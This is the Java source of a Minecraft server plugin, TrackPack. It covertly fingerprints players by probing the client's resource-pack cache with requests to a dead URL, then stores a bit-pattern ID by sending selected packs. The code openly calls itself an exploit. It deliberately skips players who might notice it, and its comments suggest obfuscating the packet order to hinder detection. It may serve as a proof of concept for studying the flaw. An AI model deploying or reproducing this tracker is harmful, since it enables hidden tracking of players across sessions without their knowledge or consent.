package laggy.trackpack;

import com.google.gson.Gson;
import net.kyori.adventure.resource.ResourcePackRequest;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerResourcePackStatusEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.FileReader;
import java.net.URI;
import java.nio.file.Files;
import java.util.*;

public final class TrackPack extends JavaPlugin implements Listener {
    public static class PackInfo {
        public String url;
        public UUID uuid;
        public String hash; // SHA1 hash

        public PackInfo(String url, UUID uuid, String hash) {
            this.url = url;
            this.uuid = uuid;
            this.hash = hash;
        }
    }

    public enum Status {
        WAITING,    // Waiting for player's response
        FAILED,     // Client failed to download the pack
        SUCCEEDED,  // Client retrieved the pack from cache
    }

    public static PackInfo[] resourcePacks;
    private final HashMap<UUID, Status[]> playerPackQueue = new HashMap<>();
    public static final String BAD_URL = "http://127.0.0.1:0";

    @Override
    public void onEnable() {
        // Load resource packs from packs.json
        resourcePacks = readPacksFromConfig();
        if (resourcePacks == null || resourcePacks.length == 0) {
            getLogger().warning("No resource packs are loaded. TrackPack will be disabled.");
            return;
        }

        // Register Bukkit event listeners
        getServer().getPluginManager().registerEvents(this, this);
    }

    // Reads the packs.json config file and parses it into PackInfo[]
    private PackInfo[] readPacksFromConfig() {
        File packsFile = new File(getDataFolder(), "packs.json");
        if (!packsFile.exists()) {
            try {
                Files.createDirectories(packsFile.getParentFile().toPath());
                Files.writeString(packsFile.toPath(), "[]");
            } catch (Exception e) {
                getLogger().warning("Failed to create packs.json file.");
            }
        }

        Gson gson = new Gson();

        try (FileReader reader = new FileReader(packsFile)) {
            PackInfo[] packs = gson.fromJson(reader, PackInfo[].class);
            if (packs != null) {
                getLogger().info("Loaded " + packs.length + " resource packs from packs.json.");
                return packs;
            } else {
                getLogger().warning("No resource packs found in packs.json.");
            }
        } catch (Exception e) {
            getLogger().warning("Can not read packs.json.");
        }

        return null;
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        // This is a safety mechanism.
        // We check if the player has loaded the server resource pack first,
        // and stop the exploit if the player fails to load the server resource pack.
        if (getServer().getServerResourcePack() != null && !event.getPlayer().hasResourcePack()) {
            getLogger().warning(String.format("Player %s fails to load the server resource pack. To prevent the player from noticing this exploit, this player would not be tracked.", event.getPlayer().getName()));
            return;
        }

        // Send the initial resource packs to the player
        sendInitialPacks(event.getPlayer());

        // Put the player in the queue
        Status[] packStatus = new Status[resourcePacks.length];
        Arrays.fill(packStatus, Status.WAITING);
        playerPackQueue.put(event.getPlayer().getUniqueId(), packStatus);
    }

    // Sends resource pack requests to the player with a fake URL (to see if the pack is cached already)
    private void sendInitialPacks(Player player) {
        // NOTE: the packet order can be randomized for obfuscation
        for (PackInfo pack : resourcePacks) {
            sendPack(player, pack.uuid, BAD_URL, pack.hash);
        }
    }

    // Handles incoming resource pack status packets from players
    @EventHandler
    private void onResourcePackStatusEvent(PlayerResourcePackStatusEvent event) {
        UUID playerId = event.getPlayer().getUniqueId();
        UUID packId = event.getID();
        PlayerResourcePackStatusEvent.Status status = event.getStatus();

        // If the player is not in the queue, ignore the packet
        if (!playerPackQueue.containsKey(playerId)) return;

        // Get the pack statuses
        Status[] packStatuses = playerPackQueue.get(playerId);

        // Find the index of the pack with the given UUID
        int index = -1;
        for (int i = 0; i < resourcePacks.length; i++) {
            if (resourcePacks[i].uuid.equals(packId)) {
                index = i;
                break;
            }
        }

        // If the pack is not found, ignore the packet
        if (index == -1) return;

        getLogger().info(String.format("Received pack status packet from %s: %s %d.", event.getPlayer().getName(), status, index));

        // Update the pack status based on the received packet
        switch (status) {
            case DISCARDED:
                packStatuses[index] = Status.SUCCEEDED;
                break;
            case FAILED_DOWNLOAD:
                packStatuses[index] = Status.FAILED;
                break;
            default:
                return;
        }

        // Calculate the player's fingerprint ID based on received pack statuses
        long fingerprintId = calculateFingerprintId(packStatuses);

        // If not all packs have been responded to, wait for more packets
        if (fingerprintId == -1) return;

        if (fingerprintId == 0) {
            // New player (no packs succeeded)

            // Generate a new fingerprint ID and send marked packs
            long newFingerprintId = generateNewFingerprintId();
            sendMarkedPacks(event.getPlayer(), newFingerprintId);

            getLogger().info(String.format("Player %s is a new player. Marked this player with fingerprint id %d now.%n", event.getPlayer().getName(), newFingerprintId));
        } else {
            // Old player (has a fingerprint)
            getLogger().info(String.format("All resource packs received for player: %s. Player have fingerprint ID: %d.%n", event.getPlayer().getName(), fingerprintId));
        }

        // Remove the player from the queue after processing
        playerPackQueue.remove(playerId);
    }


    // Calculates the fingerprint ID for a player based on their pack statuses.
    // Each bit in the ID represents whether a pack was successfully received.
    // ID -1 means not all packs are received yet.
    // ID 0 means a new player (no packs succeeded).
    private long calculateFingerprintId(Status[] packStatus) {
        long fingerprintId = 0;
        for (int i = 0; i < packStatus.length; i++) {
            switch (packStatus[i]) {
                case SUCCEEDED:
                    fingerprintId |= 1L << i;
                    break;
                case FAILED:
                    break;
                case WAITING:
                    return -1;
            }
        }
        return fingerprintId;
    }

    // Generates a new random fingerprint ID for a new player
    private long generateNewFingerprintId() {
        // This is just a simple RNG, you should use a more sophisticated function instead

        long id = 0;
        Random random = new Random();
        for (int i = 0; i < resourcePacks.length / 2; i++) {
            while (true) {
                int bitIndex = random.nextInt(resourcePacks.length);
                if ((id & (1L << bitIndex)) == 0) {
                    id |= 1L << bitIndex;
                    break;
                }
            }
        }

        return id;
    }

    // Sends resource packs to the player based on fingerprint ID
    private void sendMarkedPacks(Player player, long fingerprintId) {
        // For each bit of fingerprint id, send the corresponding resource pack
        // NOTE: the order can be randomized for obfuscation
        for (int i = 0; i < resourcePacks.length; i++) {
            if ((fingerprintId & (1L << i)) != 0) {
                PackInfo pack = resourcePacks[i];
                sendPack(player, pack.uuid, pack.url, pack.hash);
            }
        }
    }

    // Sends a resource pack request to a player
    private void sendPack(Player player, UUID uuid, String url, String hash) {
        player.sendResourcePacks(ResourcePackRequest.resourcePackRequest()
                .required(true)
                .packs(net.kyori.adventure.resource.ResourcePackInfo.resourcePackInfo(uuid, URI.create(url), hash)));
    }
}
